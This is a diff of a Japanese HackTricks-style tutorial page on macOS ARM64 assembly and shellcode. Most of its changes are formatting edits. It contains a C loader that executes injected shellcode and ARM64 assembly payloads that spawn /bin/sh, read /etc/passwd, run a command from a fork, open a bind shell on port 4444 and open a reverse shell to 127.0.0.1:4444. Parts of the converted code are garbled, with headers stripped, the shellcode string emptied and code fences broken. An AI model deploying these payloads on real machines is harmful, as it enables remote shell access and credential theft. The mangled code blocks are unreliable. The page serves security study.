+* **`AIF`**：特定の例外は、**`A`**、`I`、`F` ビットを使用して無効にできます。**`A`** が1の場合、**非同期中断**がトリガーされます。**`I`** は外部ハードウェアの**割り込みリクエスト**（IRQ）に応答するように構成され、Fは**高速割り込みリクエスト**（FIR）に関連しています。
+
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -332,10 +336,9 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-{% endcode %}
 
 {% hint style="success" %}
-時々、**`libsystem_kernel.dylib`** からの**`decompiled`**コードをチェックする方が、**ソースコード**をチェックするよりも簡単です。なぜなら、いくつかのシステムコール（BSDとMach）のコードはスクリプトを介して生成されるため（ソースコードのコメントをチェックしてください）、dylibでは何が呼び出されているかがわかるからです。
+時々、**`libsystem_kernel.dylib`** からの\*\*`decompiled`\*\*コードをチェックする方が、**ソースコード**をチェックするよりも簡単です。なぜなら、いくつかのシステムコール（BSDとMach）のコードはスクリプトを介して生成されるため（ソースコードのコメントをチェックしてください）、dylibでは何が呼び出されているかがわかるからです。
 {% endhint %}
 
 ### machdep calls
@@ -359,6 +362,7 @@ Objective-CやSwiftプログラムでよく見られるこの関数は、Objecti
 * x2... -> 呼び出されるメソッドの残りの引数
 
 したがって、この関数への分岐前にブレークポイントを設定すると、lldbで簡単に呼び出される内容を見つけることができます（この例では、オブジェクトが`NSConcreteTask`からのオブジェクトを呼び出し、コマンドを実行します）。
+
 ```
 (lldb) po $x0
 <NSConcreteTask: 0x1052308e0>
@@ -375,9 +379,11 @@ Objective-CやSwiftプログラムでよく見られるこの関数は、Objecti
 whoami
 )
 ```
+
 ### シェルコード
 
 コンパイルするには：
+
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -385,69 +391,55 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
+
 バイトを抽出するには：
+
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
+
 <details>
 
 <summary>シェルコードをテストするためのCコード</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### シェル
 
 [**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。
 
-{% tabs %}
-{% tab title="adrを使用" %}
+<div data-gb-custom-block data-tag="tabs"></div>
+
+<div data-gb-custom-block data-tag="tab" data-title='adrを使用'>
+
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -461,38 +453,27 @@ mov  x16, #59     ; Move the execve syscall number (59) into x16.
 svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 sh_path: .asciz "/bin/sh"
-```
-{% endtab %}
+````
 
-{% tab title="スタックを使用して" %}
-```armasm
-.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
-.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
-.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
-_main:
-; We are going to build the string "/bin/sh" and place it on the stack.
 
-mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
-movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
-movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
-movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+\`\`\`armasm .section \_\_TEXT,\_\_text ; This directive tells the assembler to place the following code in the \_\_text section of the \_\_TEXT segment. .global \_main ; This makes the \_main label globally visible, so that the linker can find it as the entry point of the program. .align 2 ; This directive tells the assembler to align the start of the \_main function to the next 4-byte boundary (2^2 = 4).
 
-str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+\_main: ; We are going to build the string "/bin/sh" and place it on the stack.
+
+mov x1, #0x622F ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'. movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'. movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'. movk x1, #0x68, lsl #48 ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+
+str x1, \[sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
 
 ; Prepare arguments for the execve syscall.
 
-mov  x1, #8       ; Set x1 to 8.
-sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
-mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov x1, #8 ; Set x1 to 8. sub x0, sp, x1 ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack. mov x1, xzr ; Clear x1, because we need to pass NULL as the second argument to execve. mov x2, xzr ; Clear x2, because we need to pass NULL as the third argument to execve.
 
 ; Make the syscall.
 
-mov  x16, #59     ; Move the execve syscall number (59) into x16.
-svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+mov x16, #59 ; Move the execve syscall number (59) into x16. svc #0x1337 ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
-```
+````
 #### catコマンドで読み込む
 
 目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、2番目の引数（x1）はパラメータの配列でなければなりません（メモリ内ではアドレスのスタックを意味します）。
@@ -520,8 +501,10 @@ svc 0                  ; Make the syscall
 cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
-```
-#### メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す
+````
+
+**メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す**
+
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -565,9 +548,11 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### バインドシェル
+
+**バインドシェル**
 
 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) から**ポート4444**でのバインドシェル
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -649,9 +634,11 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-#### 逆シェル
+
+**逆シェル**
 
 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)から、**127.0.0.1:4444**へのrevshell
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -718,16 +705,7 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-<details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
-
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
-* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
